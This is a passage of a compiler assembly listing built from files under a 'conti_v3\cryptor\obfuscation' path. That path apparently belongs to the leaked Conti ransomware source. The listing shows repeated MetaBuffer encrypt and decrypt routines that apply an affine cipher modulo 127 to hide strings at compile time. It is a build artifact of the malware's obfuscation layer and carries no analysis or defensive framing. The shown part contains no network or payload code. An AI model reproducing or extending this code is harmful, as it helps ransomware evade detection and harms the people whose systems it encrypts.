  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 27 00 00 00	 mov	 ecx, 39			; 00000027H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 27
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+39]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 64 00 00 00	 mov	 ecx, 100		; 00000064H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 64	 add	 r8d, 100		; 00000064H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 69 00 00 00	 mov	 ecx, 105		; 00000069H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 17	 imul	 r8d, ecx, 23

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 0b	 imul	 r8d, eax, 11
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 69	 add	 r8d, 105		; 00000069H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 0c	 sub	 eax, 12
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0c	 add	 r8d, 12
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 1f 00 00 00	 mov	 ecx, 31
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1f	 add	 r8d, 31
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 78 00 00 00	 mov	 ecx, 120		; 00000078H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2a	 imul	 r8d, ecx, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
